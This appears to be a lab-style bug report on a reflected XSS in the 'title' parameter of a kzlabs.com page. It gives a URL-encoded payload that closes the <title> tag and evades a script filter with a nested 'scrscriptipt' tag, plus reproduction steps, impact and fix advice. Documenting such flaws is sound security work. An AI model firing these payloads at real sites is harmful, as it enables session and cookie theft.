# Reflected Cross-Site Scripting (XSS) in HTML `<title>` Tag

## Summary

A Reflected Cross-Site Scripting (XSS) vulnerability exists in the `title` parameter of the application. User-controlled input is reflected inside the HTML `<title>` tag without proper sanitization, allowing arbitrary JavaScript execution in the victim’s browser.

---

## Vulnerable Endpoint

```text id="v7m2qa"
http://kzlabs.com/6.php?title=xicor%22%3E%3C/title%3E%3Cscrscriptipt%3Ealert(1)%3C/scrscriptipt%3E
```

---

## Vulnerable Parameter

```text id="r4x8zn"
title
```

---

## Payload Used

```html id="k9c1wp"
xicor"></title><scrscriptipt>alert(1)</scrscriptipt>
```

---

## Steps to Reproduce

1. Open the following URL in a browser:

   ```text
   http://kzlabs.com/6.php?title=xicor%22%3E%3C/title%3E%3Cscrscriptipt%3Ealert(1)%3C/scrscriptipt%3E
   ```

2. Observe that the payload is reflected inside the HTML `<title>` tag.

3. The injected JavaScript executes automatically and triggers a popup dialog.

---

## Proof of Concept

```text id="p5n7md"
http://kzlabs.com/6.php?title=xicor%22%3E%3C/title%3E%3Cscrscriptipt%3Ealert(1)%3C/scrscriptipt%3E
```

### Screenshot

<img width="1920" height="1078" alt="image" src="https://github.com/user-attachments/assets/c9f74785-5c04-4db6-a88b-a6ad3c4b02c1" />

---

## Impact

* Arbitrary JavaScript execution
* Session hijacking
* Cookie theft

---

## Recommendations for Fix

* Encode output before rendering
* Sanitize user-controlled input
* Implement context-aware escaping for HTML content
